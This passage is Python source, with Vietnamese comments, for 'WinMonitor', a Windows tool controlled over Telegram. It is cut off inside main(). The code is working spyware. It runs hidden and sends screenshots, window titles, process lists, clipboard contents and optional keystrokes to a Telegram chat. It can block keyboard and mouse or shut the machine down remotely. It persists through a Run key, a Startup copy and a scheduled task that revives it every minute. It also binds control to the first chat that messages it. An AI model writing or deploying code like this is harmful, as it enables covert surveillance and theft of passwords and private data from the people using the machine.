#!/usr/bin/env pythonw
# -*- coding: utf-8 -*-
# =============================================================================
#  WIN MONITOR - Giam sat toan bo may tinh Windows qua Telegram
#  ---------------------------------------------------------------------------
#  Tinh nang:
#    - Chup man hinh dinh ky (mac dinh 5 phut) va gui qua Telegram.
#    - Giam sat cua so hoat dong, tien trinh moi, clipboard, keylogger (tuy chon).
#    - Dieu khien tu xa qua Telegram: tat may, khoi dong lai, khoa may,
#      ngat / ket noi lai ban phim - chuot, doi thoi gian chup man hinh...
#    - Moi lenh "nguy hiem" (tat may / khoi dong lai / dung giam sat) deu phai
#      xac nhan bang MAT KHAU MOT LAN (OTP) gui qua Telegram.
#    - Tu khoi dong cung Windows, chay nen, tu phuc hoi neu bi kill
#      (dang ky Scheduled Task + Registry Run + ban sao trong Startup).
#    - Chi 1 file duy nhat, KHONG can cai them thu vien (chi can Python 3).
#  ---------------------------------------------------------------------------
#  HUONG DAN NHANH:
#    1) Cai Python 3 cho Windows (python.org) - nho tich "Add python.exe to PATH".
#    2) Tao bot Telegram: nhan @BotFather -> /newbot -> lay BOT TOKEN.
#    3) Lay CHAT ID cua ban: nhan @userinfobot hoac @getidsbot de lay id.
#    4) Mo file nay bang Notepad, dien 2 dong BEN DUOI (DEFAULT_BOT_TOKEN /
#       DEFAULT_CHAT_ID), roi luu lai.
#    5) Double-click file (duoi .pyw se chay khong hien cua so).
#       Lan dau no se tu copy vao %APPDATA%\WinMonitor, dang ky khoi dong cung
#       Windows + Scheduled Task de tu phuc hoi neu bi tat.
#    6) Mo Telegram, nhan /start de bat dau dieu khien.
#  ---------------------------------------------------------------------------
#  LUU Y BAO MAT:
#    - Token nam trong file. Nen dat quyen file chi user hien tai doc duoc.
#    - Chi CHAT ID da cau hinh moi duoc dieu khien bot.
# =============================================================================

import os
import sys
import json
import time
import random
import shutil
import subprocess
import threading
import traceback
import re
import queue
import urllib.request
import urllib.parse
import urllib.error
from datetime import datetime

# ----------------------------------------------------------------------------
#  CAU HINH MAC DINH  (DIEN TOKEN VA CHAT ID CUA BAN VAO DAY)
# ----------------------------------------------------------------------------
DEFAULT_BOT_TOKEN = "PUT_YOUR_BOT_TOKEN_HERE"
DEFAULT_CHAT_ID   = "PUT_YOUR_CHAT_ID_HERE"   # vi du: "123456789"

# ----------------------------------------------------------------------------
IS_WINDOWS = (os.name == "nt")
APP_NAME   = "WinMonitor"
APP_VER    = "1.0.0"

APPDATA  = os.environ.get("APPDATA") or os.path.expanduser("~")
BASE_DIR = os.path.join(APPDATA, APP_NAME)
CONFIG_PATH = os.path.join(BASE_DIR, "config.json")
LOG_PATH    = os.path.join(BASE_DIR, "monitor.log")
SELF_COPY   = os.path.join(BASE_DIR, "monitor.pyw")
STARTUP_DIR = os.path.join(APPDATA, r"Microsoft\Windows\Start Menu\Programs\Startup")
STARTUP_COPY = os.path.join(STARTUP_DIR, "WinMonitor.pyw")

RUNNING = True
CONFIG_LOCK = threading.RLock()
CFG = {}
PENDING = {}          # action -> {"code": "...", "expires": float}
MUTEX_HANDLE = None
SEND_Q = queue.Queue()

# ctypes / windows API
user32 = None
if IS_WINDOWS:
    import ctypes
    from ctypes import wintypes
    try:
        user32 = ctypes.windll.user32
    except Exception:
        user32 = None


# ============================================================================
#  LOGGING
# ============================================================================
def log(msg):
    try:
        os.makedirs(BASE_DIR, exist_ok=True)
        line = "[%s] %s\n" % (datetime.now().strftime("%Y-%m-%d %H:%M:%S"), msg)
        with open(LOG_PATH, "a", encoding="utf-8") as f:
            f.write(line)
        # gioi han file log ~ 2MB
        try:
            if os.path.getsize(LOG_PATH) > 2 * 1024 * 1024:
                with open(LOG_PATH, "r", encoding="utf-8", errors="ignore") as f:
                    data = f.readlines()[-2000:]
                with open(LOG_PATH, "w", encoding="utf-8") as f:
                    f.writelines(data)
        except Exception:
            pass
    except Exception:
        pass


# ============================================================================
#  CONFIG
# ============================================================================
DEFAULT_CONFIG = {
    "bot_token": DEFAULT_BOT_TOKEN,
    "chat_id": DEFAULT_CHAT_ID,
    "screenshot_interval": 300,      # giay
    "screenshots_enabled": True,
    "activity_monitor": True,        # bao khi doi cua so hoat dong
    "process_monitor": True,         # bao tien trinh moi
    "clipboard_monitor": False,      # bao khi clipboard doi
    "keylogger": False,              # ghi lai phim go (gui dinh ky)
    "keylog_flush": 60,              # giay/lan gui phim go
    "block_safety_minutes": 0,       # tu mo khoa ban phim/chuot sau N phut (0 = khong)
    "heartbeat_interval": 3600,      # giay/lan bao "van dang chay"
}


def load_config():
    global CFG
    cfg = dict(DEFAULT_CONFIG)
    if os.path.exists(CONFIG_PATH):
        try:
            with open(CONFIG_PATH, "r", encoding="utf-8") as f:
                saved = json.load(f)
            if isinstance(saved, dict):
                cfg.update(saved)
        except Exception as e:
            log("load_config error: %s" % e)
    CFG = cfg
    save_config()
    return CFG


def save_config():
    try:
        os.makedirs(BASE_DIR, exist_ok=True)
        with CONFIG_LOCK:
            tmp = CONFIG_PATH + ".tmp"
            with open(tmp, "w", encoding="utf-8") as f:
                json.dump(CFG, f, ensure_ascii=False, indent=2)
            os.replace(tmp, CONFIG_PATH)
    except Exception as e:
        log("save_config error: %s" % e)


def cfg_get(key, default=None):
    with CONFIG_LOCK:
        return CFG.get(key, default)


def cfg_set(key, value):
    with CONFIG_LOCK:
        CFG[key] = value
    save_config()


# ============================================================================
#  TELEGRAM API  (dung urllib - khong can thu vien ngoai)
# ============================================================================
def _tg_url(method):
    return "https://api.telegram.org/bot%s/%s" % (cfg_get("bot_token", ""), method)


def tg_call(method, params=None, files=None, timeout=45):
    params = params or {}
    try:
        if files:
            boundary = "----WinMonBoundary%08x" % random.randint(0, 0xFFFFFFFF)
            body = b""
            for k, v in params.items():
                body += ("--%s\r\nContent-Disposition: form-data; name=\"%s\"\r\n\r\n%s\r\n"
                         % (boundary, k, v)).encode("utf-8")
            for k, (filename, content, ctype) in files.items():
                body += ("--%s\r\nContent-Disposition: form-data; name=\"%s\"; filename=\"%s\"\r\n"
                         "Content-Type: %s\r\n\r\n" % (boundary, k, filename, ctype)).encode("utf-8")
                body += content + b"\r\n"
            body += ("--%s--\r\n" % boundary).encode("utf-8")
            req = urllib.request.Request(
                _tg_url(method), data=body,
                headers={"Content-Type": "multipart/form-data; boundary=%s" % boundary})
        else:
            data = urllib.parse.urlencode(params).encode("utf-8")
            req = urllib.request.Request(_tg_url(method), data=data)
        with urllib.request.urlopen(req, timeout=timeout) as r:
            return json.loads(r.read().decode("utf-8", "ignore"))
    except urllib.error.HTTPError as e:
        try:
            return json.loads(e.read().decode("utf-8", "ignore"))
        except Exception:
            return {"ok": False, "error": str(e)}
    except Exception as e:
        return {"ok": False, "error": str(e)}


def html_escape(s):
    return str(s).replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;")


def _has_chat():
    cid = str(cfg_get("chat_id", "") or "")
    return bool(cid) and "PUT_YOUR" not in cid


def notify(text):
    """Dua tin nhan van ban vao hang doi gui."""
    if not _has_chat():
        return
    SEND_Q.put({"type": "text", "text": text})


def notify_photo(path, caption=""):
    if not _has_chat():
        return
    SEND_Q.put({"type": "photo", "path": path, "caption": caption})


def sender_loop():
    """Gui tuan tu, ton trong gioi han ~1 tin/giay cua Telegram."""
    while RUNNING:
        try:
            item = SEND_Q.get(timeout=1)
        except queue.Empty:
            continue
        chat_id = cfg_get("chat_id")
        if not chat_id:
            continue
        try:
            if item["type"] == "text":
                res = tg_call("sendMessage", {
                    "chat_id": chat_id,
                    "text": item["text"][:4000],
                    "parse_mode": "HTML",
                    "disable_web_page_preview": "true",
                })
            else:  # photo
                path = item["path"]
                if not os.path.exists(path):
                    continue
                with open(path, "rb") as f:
                    content = f.read()
                res = tg_call("sendPhoto", {
                    "chat_id": chat_id,
                    "caption": item.get("caption", "")[:1000],
                    "parse_mode": "HTML",
                }, files={"photo": (os.path.basename(path), content, "image/png")}, timeout=120)
                try:
                    os.remove(path)
                except Exception:
                    pass
            if not res.get("ok"):
                desc = str(res.get("description", res.get("error", "")))
                if "429" in desc or "retry_after" in desc:
                    m = re.search(r"retry_after[\"']?\s*[:=]\s*(\d+)", desc)
                    time.sleep(int(m.group(1)) + 1 if m else 5)
                log("send error: %s" % desc)
        except Exception as e:
            log("sender_loop error: %s" % e)
        time.sleep(1.05)


# ============================================================================
#  SCREENSHOT (dung PowerShell - khong can Pillow)
# ============================================================================
def take_screenshot(path):
    if not IS_WINDOWS:
        return False
    ps_path_str = str(path).replace("'", "''")   # escape cho chuoi PS don
    ps = (
        "Add-Type -AssemblyName System.Windows.Forms\r\n"
        "Add-Type -AssemblyName System.Drawing\r\n"
        "$vs=[System.Windows.Forms.SystemInformation]::VirtualScreen\r\n"
        "$bmp=New-Object System.Drawing.Bitmap $vs.Width,$vs.Height\r\n"
        "$g=[System.Drawing.Graphics]::FromImage($bmp)\r\n"
        "$g.CopyFromScreen($vs.Left,$vs.Top,0,0,$bmp.Size)\r\n"
        "$bmp.Save('%s',[System.Drawing.Imaging.ImageFormat]::Png)\r\n"
        "$g.Dispose()\r\n"
        "$bmp.Dispose()\r\n" % ps_path_str
    )
    ps_path = os.path.join(BASE_DIR, "_shot.ps1")
    try:
        os.makedirs(BASE_DIR, exist_ok=True)
        with open(ps_path, "w", encoding="utf-8-sig") as f:
            f.write(ps)
        subprocess.run(
            ["powershell", "-NoProfile", "-NonInteractive", "-ExecutionPolicy", "Bypass",
             "-WindowStyle", "Hidden", "-File", ps_path],
            capture_output=True, timeout=60)
        return os.path.exists(path) and os.path.getsize(path) > 0
    except Exception as e:
        log("take_screenshot error: %s" % e)
        return False


def do_screenshot_send(caption_prefix="📸"):
    if not IS_WINDOWS:
        return
    path = os.path.join(BASE_DIR, "shot_%s.png" % datetime.now().strftime("%Y%m%d_%H%M%S"))
    ok = take_screenshot(path)
    if ok:
        cap = "%s <b>Chup man hinh</b>\n🕒 %s" % (
            caption_prefix, datetime.now().strftime("%H:%M:%S %d/%m/%Y"))
        notify_photo(path, cap)
    else:
        notify("⚠️ Không chụp được màn hình.")


def screenshot_loop():
    last = 0.0
    while RUNNING:
        try:
            if cfg_get("screenshots_enabled", True):
                interval = max(5, int(cfg_get("screenshot_interval", 300)))
                if time.time() - last >= interval:
                    do_screenshot_send()
                    last = time.time()
        except Exception as e:
            log("screenshot_loop error: %s" % e)
        time.sleep(1)


# ============================================================================
#  WINDOWS: cua so hoat dong / tien trinh / clipboard / ban phim
# ============================================================================
def get_foreground_title():
    if not user32:
        return ""
    try:
        hwnd = user32.GetForegroundWindow()
        length = user32.GetWindowTextLengthW(hwnd)
        buf = ctypes.create_unicode_buffer(length + 1)
        user32.GetWindowTextW(hwnd, buf, length + 1)
        return buf.value
    except Exception:
        return ""


def window_monitor():
    last = ""
    while RUNNING:
        try:
            if cfg_get("activity_monitor", True):
                t = get_foreground_title()
                if t and t != last:
                    last = t
                    notify("🪟 <b>Cửa sổ:</b> %s" % html_escape(t))
            else:
                last = ""
        except Exception as e:
            log("window_monitor error: %s" % e)
        time.sleep(2)


def list_processes():
    procs = set()
    try:
        r = subprocess.run(["tasklist", "/fo", "csv", "/nh"],
                           capture_output=True, text=True, timeout=20)
        for line in r.stdout.splitlines():
            m = re.match(r'"([^"]+)","(\d+)"', line.strip())
            if m:
                procs.add((int(m.group(2)), m.group(1)))
    except Exception as e:
        log("list_processes error: %s" % e)
    return procs


IGNORE_PROC = {"conhost.exe", "powershell.exe", "tasklist.exe", "cmd.exe",
               "svchost.exe", "python.exe", "pythonw.exe", "backgroundtaskhost.exe"}


def process_monitor():
    prev = None
    while RUNNING:
        try:
            if cfg_get("process_monitor", True):
                cur = list_processes()
                if prev is not None:
                    new = cur - prev
                    for pid, name in sorted(new):
                        if name.lower() in IGNORE_PROC:
                            continue
                        notify("🚀 <b>Tiến trình mới:</b> %s <code>(PID %d)</code>"
                               % (html_escape(name), pid))
                prev = cur
            else:
                prev = None
        except Exception as e:
            log("process_monitor error: %s" % e)
        time.sleep(5)


def get_clipboard():
    if not IS_WINDOWS:
        return ""
    try:
        r = subprocess.run(
            ["powershell", "-NoProfile", "-NonInteractive", "-Command", "Get-Clipboard -Raw"],
            capture_output=True, text=True, timeout=10)
        return (r.stdout or "").strip()
    except Exception:
        return ""


def clipboard_monitor():
    last = None
    while RUNNING:
        try:
            if cfg_get("clipboard_monitor", False):
                c = get_clipboard()
                if c and c != last:
                    last = c
                    notify("📋 <b>Clipboard:</b>\n<code>%s</code>" % html_escape(c[:1500]))
            else:
                last = None
        except Exception as e:
            log("clipboard_monitor error: %s" % e)
        time.sleep(3)


# ---- Keylogger (polling GetAsyncKeyState - khong can hook/message loop) -----
VK_SPECIAL = {
    0x08: "[BKSP]", 0x09: "[TAB]", 0x0D: "[ENTER]", 0x1B: "[ESC]",
    0x25: "[LEFT]", 0x26: "[UP]", 0x27: "[RIGHT]", 0x28: "[DOWN]",
    0x2E: "[DEL]", 0x24: "[HOME]", 0x23: "[END]", 0x21: "[PGUP]", 0x22: "[PGDN]",
    0x14: "[CAPS]", 0x5B: "[WIN]", 0x5C: "[WIN]",
}
VK_SHIFT_MAP = {
    "1": "!", "2": "@", "3": "#", "4": "$", "5": "%", "6": "^", "7": "&",
    "8": "*", "9": "(", "0": ")", "-": "_", "=": "+", "[": "{", "]": "}",
    "\\": "|", ";": ":", "'": "\"", ",": "<", ".": ">", "/": "?", "`": "~",
}


def vk_to_text(vk, shift):
    if vk in VK_SPECIAL:
        return VK_SPECIAL[vk]
    if 0x30 <= vk <= 0x39:              # 0-9
        ch = chr(vk)
        return VK_SHIFT_MAP.get(ch, ch) if shift else ch
    if 0x41 <= vk <= 0x5A:              # A-Z
        ch = chr(vk)
        return ch if shift else ch.lower()
    if vk == 0x20:
        return " "
    if 0x60 <= vk <= 0x69:              # numpad 0-9
        return chr(vk - 0x30)
    # dau cau
    punct = {0xBA: ";", 0xBB: "=", 0xBC: ",", 0xBD: "-", 0xBE: ".", 0xBF: "/",
             0xC0: "`", 0xDB: "[", 0xDC: "\\", 0xDD: "]", 0xDE: "'"}
    if vk in punct:
        base = punct[vk]
        return VK_SHIFT_MAP.get(base, base) if shift else base
    return ""


def keylogger_loop():
    pressed = set()
    buf = []
    last_flush = time.time()
    while RUNNING:
        try:
            if not cfg_get("keylogger", False) or not user32:
                pressed.clear()
                if buf:
                    buf = []
                time.sleep(0.5)
                continue
            shift = bool(user32.GetAsyncKeyState(0x10) & 0x8000)
            for vk in range(8, 256):
                down = bool(user32.GetAsyncKeyState(vk) & 0x8000)
                if down and vk not in pressed:
                    pressed.add(vk)
                    txt = vk_to_text(vk, shift)
                    if txt:
                        buf.append(txt)
                elif not down and vk in pressed:
                    pressed.discard(vk)
            # flush dinh ky
            if buf and (time.time() - last_flush) >= max(10, int(cfg_get("keylog_flush", 60))):
                text = "".join(buf)
                buf = []
                last_flush = time.time()
                if text.strip():
                    notify("⌨️ <b>Phím gõ:</b>\n<code>%s</code>" % html_escape(text[:3000]))
            if len(buf) > 4000:
                buf = buf[-4000:]
        except Exception as e:
            log("keylogger_loop error: %s" % e)
        time.sleep(0.03)


# ============================================================================
#  NGAT / KET NOI LAI BAN PHIM - CHUOT  (BlockInput)
# ============================================================================
class InputBlocker:
    def __init__(self):
        self.thread = None
        self.evt = None
        self.blocked = False
        self.lock = threading.Lock()

    def block(self, auto_minutes=0):
        with self.lock:
            if self.blocked:
                return False
            if not user32:
                return False
            self.evt = threading.Event()
            self.thread = threading.Thread(
                target=self._run, args=(auto_minutes,), daemon=True)
            self.blocked = True
            self.thread.start()
            return True

    def _run(self, auto_minutes):
        ok = False
        try:
            ok = bool(user32.BlockInput(True))
        except Exception as e:
            log("BlockInput(True) error: %s" % e)
        if not ok:
            self.blocked = False
            notify("⚠️ Không ngắt được bàn phím/chuột (có thể cần chạy quyền Admin).")
            return
        notify("🔒 Đã NGẮT bàn phím & chuột." +
               (" Tự mở khóa sau %d phút." % auto_minutes if auto_minutes else
                " Gửi /unblock để mở lại."))
        try:
            timeout = (auto_minutes * 60) if auto_minutes else None
            self.evt.wait(timeout=timeout)
        finally:
            try:
                user32.BlockInput(False)
            except Exception as e:
                log("BlockInput(False) error: %s" % e)
            self.blocked = False
            notify("🔓 Đã KẾT NỐI LẠI bàn phím & chuột.")

    def unblock(self):
        with self.lock:
            if self.evt:
                self.evt.set()
                return True
            return False


BLOCKER = InputBlocker()


# ============================================================================
#  DIEU KHIEN HE THONG
# ============================================================================
def do_lock():
    if user32:
        try:
            user32.LockWorkStation()
            return True
        except Exception as e:
            log("lock error: %s" % e)
    return False


def do_shutdown():
    try:
        subprocess.run(["shutdown", "/s", "/t", "5", "/c", "WinMonitor: remote shutdown"],
                       capture_output=True)
        return True
    except Exception as e:
        log("shutdown error: %s" % e)
        return False


def do_restart():
    try:
        subprocess.run(["shutdown", "/r", "/t", "5", "/c", "WinMonitor: remote restart"],
                       capture_output=True)
        return True
    except Exception as e:
        log("restart error: %s" % e)
        return False


# ============================================================================
#  DUY TRI / TU PHUC HOI  (persistence)
# ============================================================================
def find_pythonw():
    exe = sys.executable or "pythonw.exe"
    base = os.path.basename(exe).lower()
    if base == "python.exe":
        cand = os.path.join(os.path.dirname(exe), "pythonw.exe")
        if os.path.exists(cand):
            return cand
    if base in ("pythonw.exe", "python.exe"):
        return exe
    w = shutil.which("pythonw")
    return w or exe


def _run_hidden(cmd):
    try:
        subprocess.run(cmd, capture_output=True, timeout=30,
                       creationflags=getattr(subprocess, "CREATE_NO_WINDOW", 0))
    except Exception as e:
        log("run cmd error: %s" % e)


def register_scheduled_tasks():
    pythonw = find_pythonw()
    tr = '"%s" "%s"' % (pythonw, SELF_COPY)
    # task 1: moi 1 phut (tu phuc hoi neu bi kill)
    _run_hidden(['schtasks', '/Create', '/TN', 'WinMonitorGuard',
                 '/TR', tr, '/SC', 'MINUTE', '/MO', '1', '/F'])
    # task 2: khi dang nhap (du phong)
    _run_hidden(['schtasks', '/Create', '/TN', 'WinMonitorLogon',
                 '/TR', tr, '/SC', 'ONLOGON', '/F'])


def register_run_key():
    try:
        import winreg
        pythonw = find_pythonw()
        val = '"%s" "%s"' % (pythonw, SELF_COPY)
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                             r"Software\Microsoft\Windows\CurrentVersion\Run",
                             0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, "WinMonitor", 0, winreg.REG_SZ, val)
        winreg.CloseKey(key)
    except Exception as e:
        log("register_run_key error: %s" % e)


def ensure_persistence():
    if not IS_WINDOWS:
        return
    try:
        os.makedirs(BASE_DIR, exist_ok=True)
        src = os.path.abspath(sys.argv[0]) if sys.argv and sys.argv[0] else __file__
        # ban sao chuan trong APPDATA
        if os.path.abspath(SELF_COPY) != os.path.abspath(src):
            try:
                shutil.copy2(src, SELF_COPY)
            except Exception:
                pass
        # ban sao trong Startup
        try:
            os.makedirs(STARTUP_DIR, exist_ok=True)
            if os.path.abspath(STARTUP_COPY) not in (os.path.abspath(src), os.path.abspath(SELF_COPY)):
                shutil.copy2(SELF_COPY if os.path.exists(SELF_COPY) else src, STARTUP_COPY)
        except Exception:
            pass
        register_run_key()
        register_scheduled_tasks()
    except Exception as e:
        log("ensure_persistence error: %s" % e)


def selfheal_loop():
    while RUNNING:
        time.sleep(300)
        try:
            ensure_persistence()
        except Exception as e:
            log("selfheal_loop error: %s" % e)


def remove_persistence():
    """Go bo khoi dong cung Windows + scheduled task (dung khi /stop da xac thuc)."""
    if not IS_WINDOWS:
        return
    for tn in ("WinMonitorGuard", "WinMonitorLogon"):
        _run_hidden(['schtasks', '/Delete', '/TN', tn, '/F'])
    try:
        import winreg
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                             r"Software\Microsoft\Windows\CurrentVersion\Run",
                             0, winreg.KEY_SET_VALUE)
        try:
            winreg.DeleteValue(key, "WinMonitor")
        except Exception:
            pass
        winreg.CloseKey(key)
    except Exception:
        pass
    for p in (STARTUP_COPY, SELF_COPY):
        try:
            if os.path.abspath(p) != os.path.abspath(sys.argv[0]):
                os.remove(p)
        except Exception:
            pass
    # xoa file dang chay khi reboot
    try:
        MOVEFILE_DELAY_UNTIL_REBOOT = 0x4
        ctypes.windll.kernel32.MoveFileExW(sys.argv[0], None, MOVEFILE_DELAY_UNTIL_REBOOT)
    except Exception:
        pass


# ============================================================================
#  OTP / HANH DONG NGUY HIEM
# ============================================================================
def request_otp(action, label):
    code = "%06d" % random.randint(0, 999999)
    PENDING[action] = {"code": code, "expires": time.time() + 120}
    notify(
        "🔐 <b>XÁC NHẬN %s</b>\n"
        "Mã dùng 1 lần: <code>%s</code>\n"
        "Gửi <code>/confirm %s</code> trong vòng 120 giây.\n"
        "Gửi /cancel để hủy." % (label, code, code))


def execute_action(action):
    if action == "shutdown":
        notify("🖥️ Đang TẮT MÁY (sau 5 giây)...")
        time.sleep(1)
        do_shutdown()
    elif action == "restart":
        notify("🔄 Đang KHỞI ĐỘNG LẠI (sau 5 giây)...")
        time.sleep(1)
        do_restart()
    elif action == "stop":
        notify("🛑 Đã xác thực. Đang DỪNG GIÁM SÁT và gỡ khỏi khởi động cùng Windows...")
        remove_persistence()
        time.sleep(1.5)
        global RUNNING
        RUNNING = False
        time.sleep(0.5)
        os._exit(0)


# ============================================================================
#  XU LY LENH TELEGRAM
# ============================================================================
HELP_TEXT = (
    "🤖 <b>WIN MONITOR</b> - Trợ lý giám sát\n\n"
    "<b>Giám sát</b>\n"
    "/status - Trạng thái hiện tại\n"
    "/shot - Chụp màn hình ngay\n"
    "/interval &lt;giây&gt; - Đổi chu kỳ chụp (vd: /interval 120)\n"
    "/screen on|off - Bật/tắt chụp định kỳ\n"
    "/activity on|off - Bật/tắt báo đổi cửa sổ\n"
    "/process on|off - Bật/tắt báo tiến trình mới\n"
    "/clip on|off - Bật/tắt theo dõi clipboard\n"
    "/keylog on|off - Bật/tắt ghi phím gõ\n\n"
    "<b>Điều khiển</b>\n"
    "/block [phút] - Ngắt bàn phím & chuột (tự mở sau N phút nếu có)\n"
    "/unblock - Kết nối lại bàn phím & chuột\n"
    "/lock - Khóa màn hình\n\n"
    "<b>Nguy hiểm (cần OTP)</b>\n"
    "/shutdown - Tắt máy\n"
    "/restart - Khởi động lại\n"
    "/stop - Dừng giám sát\n"
    "/confirm &lt;mã&gt; - Xác nhận OTP\n"
    "/cancel - Hủy yêu cầu\n\n"
    "<b>Khác</b>\n"
    "/config - Xem cấu hình\n"
    "/set &lt;khóa&gt; &lt;giá trị&gt; - Đổi cấu hình\n"
    "/logs [n] - Xem log gần đây"
)


def parse_bool(v):
    return str(v).strip().lower() in ("1", "on", "true", "yes", "bat", "bật", "co", "có")


def handle_command(text, chat_id):
    text = (text or "").strip()
    if not text.startswith("/"):
        return
    parts = text.split()
    cmd = parts[0].lower().split("@")[0]   # bo @botname
    args = parts[1:]

    if cmd in ("/start", "/help"):
        notify(HELP_TEXT)
        return

    if cmd == "/status":
        up = int(time.time() - START_TIME)
        h, m, s = up // 3600, (up % 3600) // 60, up % 60
        txt = (
            "📊 <b>TRẠNG THÁI</b>\n"
            "⏱ Uptime: %dh %dm %ds\n"
            "📸 Chụp: %s | mỗi %ss\n"
            "🪟 Cửa sổ: %s\n"
            "🚀 Tiến trình: %s\n"
            "📋 Clipboard: %s\n"
            "⌨️ Keylog: %s\n"
            "🔒 Bàn phím/chuột: %s\n"
            "💓 Heartbeat: %ss\n"
        ) % (
            h, m, s,
            "BẬT" if cfg_get("screenshots_enabled") else "TẮT",
            cfg_get("screenshot_interval"),
            "BẬT" if cfg_get("activity_monitor") else "TẮT",
            "BẬT" if cfg_get("process_monitor") else "TẮT",
            "BẬT" if cfg_get("clipboard_monitor") else "TẮT",
            "BẬT" if cfg_get("keylogger") else "TẮT",
            "ĐANG NGẮT" if BLOCKER.blocked else "BÌNH THƯỜNG",
            cfg_get("heartbeat_interval"),
        )
        notify(txt)
        return

    if cmd == "/shot":
        notify("📸 Đang chụp...")
        threading.Thread(target=do_screenshot_send, daemon=True).start()
        return

    if cmd == "/interval":
        if not args or not args[0].isdigit():
            notify("Cú pháp: /interval <giây> (tối thiểu 5)")
            return
        val = max(5, int(args[0]))
        cfg_set("screenshot_interval", val)
        notify("✅ Đã đổi chu kỳ chụp thành %d giây." % val)
        return

    if cmd in ("/screen", "/activity", "/process", "/clip", "/keylog"):
        keymap = {"/screen": "screenshots_enabled", "/activity": "activity_monitor",
                  "/process": "process_monitor", "/clip": "clipboard_monitor",
                  "/keylog": "keylogger"}
        key = keymap[cmd]
        if not args:
            notify("Cú pháp: %s on|off" % cmd)
            return
        cfg_set(key, parse_bool(args[0]))
        notify("✅ %s = %s" % (key, "BẬT" if cfg_get(key) else "TẮT"))
        return

    if cmd == "/block":
        auto = 0
        if args and args[0].isdigit():
            auto = int(args[0])
        if auto == 0:
            auto = int(cfg_get("block_safety_minutes", 0) or 0)
        if BLOCKER.blocked:
            notify("ℹ️ Bàn phím/chuột đang bị ngắt rồi.")
        else:
            threading.Thread(target=BLOCKER.block, args=(auto,), daemon=True).start()
        return

    if cmd == "/unblock":
        if BLOCKER.unblock():
            notify("🔓 Đang kết nối lại bàn phím & chuột...")
        else:
            notify("ℹ️ Bàn phím/chuột đang bình thường.")
        return

    if cmd == "/lock":
        if do_lock():
            notify("🔒 Đã khóa màn hình.")
        else:
            notify("⚠️ Không khóa được màn hình.")
        return

    if cmd == "/shutdown":
        request_otp("shutdown", "TẮT MÁY")
        return
    if cmd in ("/restart", "/reboot"):
        request_otp("restart", "KHỞI ĐỘNG LẠI")
        return
    if cmd == "/stop":
        request_otp("stop", "DỪNG GIÁM SÁT")
        return

    if cmd == "/confirm":
        if not args:
            notify("Cú pháp: /confirm <mã>")
            return
        code = args[0].strip()
        now = time.time()
        for action, info in list(PENDING.items()):
            if info["expires"] < now:
                PENDING.pop(action, None)
                continue
            if info["code"] == code:
                PENDING.pop(action, None)
                execute_action(action)
                return
        notify("❌ Mã không đúng hoặc đã hết hạn.")
        return

    if cmd == "/cancel":
        PENDING.clear()
        notify("✅ Đã hủy mọi yêu cầu đang chờ.")
        return

    if cmd == "/config":
        with CONFIG_LOCK:
            safe = dict(CFG)
        if safe.get("bot_token"):
            safe["bot_token"] = safe["bot_token"][:8] + "...(ẩn)"
        notify("<b>CẤU HÌNH</b>\n<code>%s</code>" %
               html_escape(json.dumps(safe, ensure_ascii=False, indent=2)))
        return

    if cmd == "/set":
        if len(args) < 2:
            notify("Cú pháp: /set <khóa> <giá trị>")
            return
        key = args[0]
        val = " ".join(args[1:])
        allowed = set(DEFAULT_CONFIG.keys()) - {"bot_token", "chat_id"}
        if key not in allowed:
            notify("❌ Khóa không hợp lệ. Các khóa: %s" % ", ".join(sorted(allowed)))
            return
        # ep kieu
        cur = cfg_get(key)
        try:
            if isinstance(cur, bool):
                newval = parse_bool(val)
            elif isinstance(cur, int):
                newval = int(val)
            else:
                newval = val
        except Exception:
            notify("❌ Giá trị không hợp lệ.")
            return
        cfg_set(key, newval)
        notify("✅ %s = %s" % (key, newval))
        return

    if cmd == "/logs":
        n = 30
        if args and args[0].isdigit():
            n = min(200, int(args[0]))
        try:
            with open(LOG_PATH, "r", encoding="utf-8", errors="ignore") as f:
                lines = f.readlines()[-n:]
            notify("<b>LOG (cuối)</b>\n<code>%s</code>" % html_escape("".join(lines)[-3500:]))
        except Exception as e:
            notify("⚠️ Không đọc được log: %s" % e)
        return

    notify("❓ Lệnh không rõ. Gửi /help để xem danh sách.")


def is_authorized(chat_id):
    cid = str(cfg_get("chat_id", "") or "").strip()
    if not cid or cid == DEFAULT_CHAT_ID or "PUT_YOUR" in cid:
        # chua cau hinh -> tu dong lay chat dau tien
        cfg_set("chat_id", str(chat_id))
        notify("✅ Đã liên kết chat này (<code>%s</code>) làm chủ.\nGửi /help để bắt đầu." % chat_id)
        return True
    return str(chat_id) == cid


def handle_update(upd):
    msg = upd.get("message") or upd.get("edited_message")
    if not msg:
        return
    chat = msg.get("chat", {})
    chat_id = chat.get("id")
    text = msg.get("text", "")
    if chat_id is None:
        return
    try:
        if not is_authorized(chat_id):
            log("Unauthorized chat: %s text=%r" % (chat_id, text))
            return
        handle_command(text, chat_id)
    except Exception as e:
        log("handle_update error: %s\n%s" % (e, traceback.format_exc()))


# ============================================================================
#  HEARTBEAT
# ============================================================================
def heartbeat_loop():
    while RUNNING:
        try:
            hb = int(cfg_get("heartbeat_interval", 3600) or 0)
            if hb > 0:
                time.sleep(hb)
                if RUNNING:
                    notify("💓 WinMonitor vẫn đang chạy. Uptime %d phút." %
                           int((time.time() - START_TIME) / 60))
            else:
                time.sleep(60)
        except Exception as e:
            log("heartbeat_loop error: %s" % e)
            time.sleep(60)


# ============================================================================
#  SINGLE INSTANCE + HIDE CONSOLE
# ============================================================================
def acquire_single_instance():
    global MUTEX_HANDLE
    if not IS_WINDOWS:
        return True
    try:
        kernel32 = ctypes.windll.kernel32
        MUTEX_HANDLE = kernel32.CreateMutexW(None, False, "Global\\WinMonitorSingleton_v1")
        return kernel32.GetLastError() != 183   # ERROR_ALREADY_EXISTS
    except Exception as e:
        log("mutex error: %s" % e)
        return True


def hide_console():
    if not IS_WINDOWS:
        return
    try:
        hwnd = ctypes.windll.kernel32.GetConsoleWindow()
        if hwnd:
            ctypes.windll.user32.ShowWindow(hwnd, 0)
    except Exception:
        pass


# ============================================================================
#  MAIN
# ============================================================================
START_TIME = time.time()


def main():
    global RUNNING, START_TIME
    START_TIME = time.time()
    os.makedirs(BASE_DIR, exist_ok=True)
    hide_console()

    load_config()

    # Cau hinh nhanh qua tham so dong lenh (tien khi cai dat lan dau):
    #   win_monitor.pyw --token 123:ABC --chat 987654321
    _argv = sys.argv[1:]
